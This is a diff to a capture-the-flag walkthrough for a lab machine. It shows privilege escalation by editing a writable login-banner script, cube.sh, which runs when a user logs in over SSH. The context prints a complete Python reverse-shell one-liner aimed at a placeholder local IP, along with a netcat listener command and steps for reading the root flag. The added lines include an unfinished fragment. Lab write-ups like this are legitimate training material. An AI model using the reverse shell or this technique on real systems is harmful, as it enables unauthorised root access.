@@ -74,12 +74,21 @@ Access the web server running on port 80 by visiting **htpp://<target_IP>** in t
 - Once logged in, enumerate the system:
   - Once the SSH connection is established, we must discover what group(s) the user "baksteen" belongs
   - The user belongs to a group called "users" with permission to run '**/opt/cube/cube/sh**'
+    - Running this script looks exactly like the banner displayed when logging in via SSH
+   
+![Screenshot 2024-09-01 at 6 47 56 PM](https://github.com/user-attachments/assets/2661a901-2a0f-4dc7-9d5f-45657e7f54b0)
+
+
+
+
+    - Look at the 
   - Edit **cube.sh** by inserting a Python reverse shell:
     - **python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<local-IP>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'**
   - Set up a Netcat listener on local machine: **nc -nlvp 1234**
   - In a seperate terminal, SSH back into the machine: **ssh <username>@<target_IP>**
   - The reverse shell should connect to your listener.  Access the root directory and read the flag:
     - cd /root
+
     - cat flag.txt
    
 ![flag captured](https://github.com/user-attachments/assets/3ccb6ba7-0d07-4856-95c2-c0247692e722)
